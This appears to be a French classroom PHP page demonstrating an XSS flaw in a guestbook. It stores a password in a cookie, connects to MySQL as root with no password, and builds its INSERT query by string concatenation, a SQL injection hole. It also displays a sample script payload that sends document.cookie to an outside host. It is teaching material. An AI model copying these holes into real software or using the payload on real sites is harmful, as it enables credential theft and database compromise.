<?php


setcookie('pwd', 'admin123');

$pdo = new PDO("mysql:host=localhost;dbname=securite", 'root', '');
if(isset($_POST['ajouterMot'])){
    $mot = $_POST['mot'];
    $pdo->query("INSERT INTO livredor VALUES('', '$mot')");
}

?>

<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    
</head>
<body>

<h1> Faille XSS</h1>

<?php





$selectall = $pdo->query("SELECT * FROM livredor");
$result = $selectall->fetchALL();
foreach ($result as $ligne) {
    // la fonction htmlspecialchars pour échapper les données dynamiques avant de les afficher dans le code HTML
    echo htmlspecialchars($ligne['mot'], ENT_QUOTES, 'UTF-8') . '<br>';
}
?>

<h3>livre d'or</h3>
<form method="post" action="#">
    Mon mot : <textarea name="mot"></textarea><br>
    <input type="submit" value="ajouter mon mot" name="ajouterMot">
    
</form>

<p>Ce site stocke votre mot de passe dans un cookie</p>

<h3>Example d'attaque XSS</h3>

<input style="width:100%" value="<script>document.location=\'https://tvinchent-epsi.github.io/xss.html?cookie=\'+document.cookie</script>">
<p> En ajoutant ce script en livre d'or;
    <ul>
        <li>vous créez une redirection vers mon script malveillant</li>
</body>
</html>  